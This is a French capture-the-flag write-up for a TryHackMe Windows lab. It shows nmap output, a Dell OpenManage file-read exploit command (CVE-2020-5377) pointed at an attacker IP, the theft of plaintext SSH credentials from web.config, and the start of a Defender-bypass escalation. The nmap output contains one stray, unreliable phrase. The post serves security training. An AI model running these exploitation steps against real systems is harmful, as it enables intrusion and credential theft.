<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Hack Smarter Security</title>
<meta name=description content="Platforme: TryHackMe Lien: Hack Smarter Security Niveau: Moyen OS: Windows Dans Hack Smarter Security, nous devons exploiter un serveur Windows utilisant …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-hacksmartersecurity/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Hack Smarter Security"><meta property="og:description" content="Platforme: TryHackMe Lien: Hack Smarter Security Niveau: Moyen OS: Windows Dans Hack Smarter Security, nous devons exploiter un serveur Windows utilisant …"><meta property="og:image" content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Hack Smarter Security"><meta name=twitter:description content="Platforme: TryHackMe Lien: Hack Smarter Security Niveau: Moyen OS: Windows Dans Hack Smarter Security, nous devons exploiter un serveur Windows utilisant …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-hacksmartersecurity/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-hacksmartersecurity/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-hacksmartersecurity/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-hacksmartersecurity/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Hack Smarter Security</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>22 Mars 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/r/room/hacksmartersecurity>Hack Smarter Security</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p>Dans Hack Smarter Security, nous devons exploiter un serveur Windows utilisant quelques services (dont SSH). Après avoir exploité un service peu courant pour accéder au système, nous devons contourner Microsoft Defender afin de prendre le contrôle d&rsquo;un compte privilégié.</p><p>L&rsquo;adresse IP cible est <code>10.10.189.226</code>.</p><h2 id=reconnaissance>Reconnaissance</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226
</code></pre><p>Plusieurs ports sont ouverts :</p><ul><li>FTP sur le port 21, avec une connexion anonyme autorisée</li><li>SSH sur le port 22, qui peut potentiellement être notre point d&rsquo;accès au système si des identifiants sont trouvés</li><li>Un serveur Windows IIS sur le port 80</li><li>Les résultats du scan ne nous permettent pas de déterminer avec certitude quel service est sur le port 1311</li><li>Le serveur Windows WBT fonctionne sur le port 3389, il est utilisé pour les connexions de Windows Remote Desktop et de Remote Assistance</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-18 18:27 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.160.34
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.24s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>995</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>21/tcp   open  ftp           Microsoft ftpd
</span></span><span style=display:flex><span>| ftp-syst: 
</span></span><span style=display:flex><span>|_  SYST: Windows_NT
</span></span><span style=display:flex><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#56b6c2>(</span>FTP code 230<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| 06-28-23  02:58PM                 <span style=color:#d19a66>3722</span> Credit-Cards-We-Pwned.txt
</span></span><span style=display:flex><span>|_06-28-23  03:00PM              <span style=color:#d19a66>1022126</span> stolen-passport.png
</span></span><span style=display:flex><span>22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>2048</span> 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: HackSmarterSec
</span></span><span style=display:flex><span>1311/tcp open  ssl/rxmon?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> 
</span></span><span style=display:flex><span>|     Strict-Transport-Security: max-age<span style=color:#56b6c2>=</span><span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; <span style=color:#e06c75>mode</span><span style=color:#56b6c2>=</span>block
</span></span><span style=display:flex><span>|     vary: accept-encoding
</span></span><span style=display:flex><span>|     Content-Type: text/html;<span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>UTF-8
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d19a66>18</span> Mar <span style=color:#d19a66>2024</span> 23:28:22 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style=color:#98c379>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;META http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span> <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;stylesheet&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;style <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style=display:flex><span>|     &lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/prototype.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/gnavbar.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/Clarity.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> 
</span></span><span style=display:flex><span>|     Strict-Transport-Security: max-age<span style=color:#56b6c2>=</span><span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; <span style=color:#e06c75>mode</span><span style=color:#56b6c2>=</span>block
</span></span><span style=display:flex><span>|     vary: accept-encoding
</span></span><span style=display:flex><span>|     Content-Type: text/html;<span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>UTF-8
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d19a66>18</span> Mar <span style=color:#d19a66>2024</span> 23:28:29 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style=color:#98c379>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;META http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span> <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;stylesheet&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;style <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style=display:flex><span>|_    &lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/prototype.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/gnavbar.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/Clarity.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>hacksmartersec/organizationName<span style=color:#56b6c2>=</span>Dell Inc/stateOrProvinceName<span style=color:#56b6c2>=</span>TX/countryName<span style=color:#56b6c2>=</span>US
</span></span><span style=display:flex><span>| Not valid before: 2023-06-30T19:03:17
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-29T19:03:17
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-18T23:29:06+00:00; +2s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>hacksmartersec
</span></span><span style=display:flex><span>| Not valid before: 2024-03-17T23:23:26
</span></span><span style=display:flex><span>|_Not valid after:  2024-09-16T23:23:26
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   DNS_Domain_Name: hacksmartersec
</span></span><span style=display:flex><span>|   DNS_Computer_Name: hacksmartersec
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-03-18T23:29:00+00:00
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port1311-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%T<span style=color:#56b6c2>=</span>SSL%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>3/18%Time<span style=color:#56b6c2>=</span>65F8CE13%P<span style=color:#56b6c2>=</span>x86_64-pc-linux
</span></span><span style=display:flex><span>SF:-gnu%r<span style=color:#56b6c2>(</span>GetRequest,1089,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0Mon,\x2018\x20Mar\x202024\x2023:28:22\x20GMT\r\nConnection:\x20close\r
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:Strict//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;html&gt;<span style=color:#98c379>\r\n</span>&lt;head&gt;<span style=color:#98c379>\r\n</span>&lt;META<span style=color:#98c379>\x</span>20http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>Content-Type<span style=color:#98c379>\&#34;\x</span>20conte
</span></span><span style=display:flex><span>SF:nt<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/html;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>UTF-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\r\n</span>&lt;link<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/css<span style=color:#98c379>\&#34;\x</span>20rel<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>stylesheet<span style=color:#98c379>\&#34;\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/oma/css
</span></span><span style=display:flex><span>SF:/loginmaster<span style=color:#98c379>\.</span>css<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;style<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/css<span style=color:#98c379>\&#34;</span>&gt;&lt;/style&gt;<span style=color:#98c379>\r\n</span>&lt;script
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/javascript<span style=color:#98c379>\&#34;\x</span>20src<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/oma/js/prototype<span style=color:#98c379>\.</span>js<span style=color:#98c379>\&#34;\x</span>20langua
</span></span><span style=display:flex><span>SF:ge<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>javascript<span style=color:#98c379>\&#34;</span>&gt;&lt;/script&gt;&lt;script<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/javascript<span style=color:#98c379>\&#34;\x</span>20src<span style=color:#56b6c2>=</span><span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:<span style=color:#98c379>&#34;/oma/js/gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20t
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ype=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;ja
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:vascript\&#34;&gt;&lt;/script&gt;&lt;script\x20language=\&#34;javascript\&#34;&gt;\r\n\x20&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>HTT
</span></span><span style=display:flex><span>SF:POptions,1089,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:18\x20Mar\x202024\x2023:28:29\x20GMT\Using fileless malwarer\nConnection:\x20close\r\n\r\n&lt;!D
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:OCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:N\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\&#34;&gt;\r\n&lt;ht
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ml&gt;\r\n&lt;head&gt;\r\n&lt;META\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:/html;\x20charset=UTF-8\&#34;&gt;\r\n&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;\r\n&lt;link
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20type=\&#34;text/css\&#34;\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/oma/css/loginmas
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ter\.css\&#34;&gt;\r\n&lt;style\x20type=\&#34;text/css\&#34;&gt;&lt;/style&gt;\r\n&lt;script\x20type=
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/prototype\.js\&#34;\x20language=\&#34;java
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:script\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;tex
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:t/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;javascript\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&#34;</span>&gt;&lt;/script&gt;&lt;script<span style=color:#98c379>\x</span>20language<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>javascript<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n\x</span>20<span style=color:#98c379>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Host script results:
</span></span></span><span style=display:flex><span><span style=color:#98c379>|_clock-skew: mean: 2s, deviation: 0s, median: 1s
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#98c379>Nmap done: 1 IP address (1 host up) scanned in 80.56 seconds
</span></span></span></code></pre></div><h2 id=enumération>Enumération</h2><p>Le scan nmap révèle que le serveur FTP permet une connexion anonyme. Après avoir accédé au serveur, nous trouvons deux fichiers <code>Credit-Cards-We-Pwned.txt</code> et <code>stolen-passport.png</code>.</p><p><img src=/images/THM-HackSmarterSecurity/ftp-server.png alt="FTP files"></p><p>Le fichier <code>Credit-Cards-We-Pwned.txt</code> contient une liste d&rsquo;informations de cartes de crédit, qui sont certainement fausses puisqu&rsquo;il s&rsquo;agit d&rsquo;un hacking challenge.</p><p><img src=/images/THM-HackSmarterSecurity/fake-credit-cards.png alt="Fake credit cards numbers"></p><p>Le transfert du fichier <code>stolen-passport.png</code> échoue à cause du mode ASCII activé sur le serveur FTP, les images sont souvent stockées en format binaire.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img.png alt="Password image transfer fails"></p><p>Après être passé en mode binaire avec <code>binary</code>, le transfert réussit.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img2.png alt="Password image transfer success"></p><p>Rien d&rsquo;intéressant n&rsquo;est obtenu après avoir utilisé <code>strings</code> et <code>exiftool</code> sur le fichier. Cette piste finit par être un cul de sac qui ne mène à rien d&rsquo;exploitable.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img3.png alt="Picture of the eye of the room author"></p><p>Après avoir visité le site web, rien de particulier n&rsquo;est trouvé, il s&rsquo;agit d&rsquo;un simple site web statique sans aucune fonctionnalité.</p><p><img src=/images/THM-HackSmarterSecurity/hackers-website.png alt="Hackers website"></p><p>L&rsquo;énumération des répertoires et sous-domaines avec <code>gobuster</code> est également infructueuse.</p><p>Accéder au service sur le port <code>1311</code> avec <code>http://10.10.189.226:1311/</code> produit une erreur.</p><p><img src=/images/THM-HackSmarterSecurity/port1311-error.png alt="port 1311 error"></p><p>Ce problème peut être résolu en utilisant <code>https</code> dans ce cas. Nous obtenons une page de login <code>Dell EMC OpenManage</code>.</p><p><img src=/images/THM-HackSmarterSecurity/dell-openmanage.png alt="Dell OpenManage service"></p><p>Essayer de contourner la page de connexion via l&rsquo;exploit trouvé dans ce <a href=https://www.tenable.com/security/research/tra-2021-07>Tenable blog post</a> est un échec.</p><p>En allant dans la section <code>About</code>, nous découvrons que le logiciel fonctionne avec la version <code>9.4.0.2</code>.</p><p><img src=/images/THM-HackSmarterSecurity/Dell-OMACS-version.png alt="Dell OMACS version"></p><p>En recherchant des vulnérabilités, nous trouvons <a href=https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/>CVE-2020-5377</a>, il s&rsquo;agit d&rsquo;une vulnérabilité de lecture de fichier dans <code>Dell OpenManage Server Administrator</code> et un PoC est trouvé <a href=https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514>ici</a>.</p><p>En suivant les instructions d&rsquo;utilisation, nous tentons d&rsquo;exploiter le system cible.</p><pre tabindex=0><code>python3 Dell-xploit.py 10.2.104.130 10.10.189.226:1311
</code></pre><p><img src=/images/THM-HackSmarterSecurity/Dell-exploit.png alt="Dell file read exploit"></p><p>Nous pouvons lire les fichiers sur le serveur. Le scan nmap nous apprend que la cible utilise <code>Microsoft IIS</code> sur le port 80</p><ul><li>Le dossier racine d&rsquo;IIS est situé à <code>C:\inetpub\wwwroot</code></li><li>Nous trouvons <code>commonName=hacksmartersec</code> dans la section du port 1311</li><li>Nous savons que le fichier <code>web.config</code> doit être présent à la racine du contenu de l&rsquo;application déployée. Vous pouvez en savoir plus à ce sujet <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0">ici</a></li></ul><p>En appliquant toutes les informations dont nous disposons, les identifiants de l&rsquo;utilisateur <code>tyler</code> sont trouvés dans <code>C:inetpub\wwwroot\hacksmartersec\web.config</code>.</p><p><img src=/images/THM-HackSmarterSecurity/creds.png alt="Tyler SSH credentials found"></p><h2 id=foothold>Foothold</h2><p>En utilisant <code>tyler:IAmA1337h4x0randIkn0wit!</code> nous arrivons à nous connecter via SSH.</p><p><img src=/images/THM-HackSmarterSecurity/ssh-access.png alt="SSH access with user tyler credentials"></p><h3 id=what-is-usertxt>What is user.txt?</h3><p>Le fichier <code>user.txt</code> est alors accessible à l&rsquo;adresse <code>C:\Users\tyler\Desktop\user.txt</code>.</p><p><img src=/images/THM-HackSmarterSecurity/user-flag.png alt="User flag"></p><h2 id=escalade-de-privilèges>Escalade de privilèges</h2><h3 id=création-dun-nouveau-compte-administrateur>Création d&rsquo;un nouveau compte administrateur</h3><p>Nous devons maintenant trouver des pistes d&rsquo;escalade de privilèges. La tentative d&rsquo;utilisation de <code>winPEAS</code> pour l&rsquo;énumération du système échoue, le fichier est signalé et arrêté par Microsoft Defender.</p><p><img src=/images/THM-HackSmarterSecurity/winpeas-fail.png 